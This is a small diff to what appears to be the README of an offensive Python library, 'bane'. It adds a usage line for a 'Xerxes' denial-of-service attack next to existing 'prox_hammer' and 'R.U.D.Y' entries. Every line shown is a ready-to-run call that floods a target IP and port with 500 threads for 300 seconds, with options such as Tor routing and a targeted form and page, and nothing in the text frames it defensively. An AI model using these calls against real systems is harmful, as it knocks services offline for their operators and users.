@@ -127,3 +127,5 @@ II-Usage:
 <br>bane.prox_hammer(IP, p= port , duration= 300 , threads=500 , timeout=5)
 <h4>R.U.D.Y attack:</h4>
 <br>bane.rudy(IP, p= port , duration= 300 ,set_tor=False , threads=500 , timeout=5 , form="q" , page="/search.php")
+<h4>Xerxes attack:</h4>
+<br>bane.xerxes(IP, p= port , duration= 300 ,set_tor=False , threads=500 , timeout=5 )
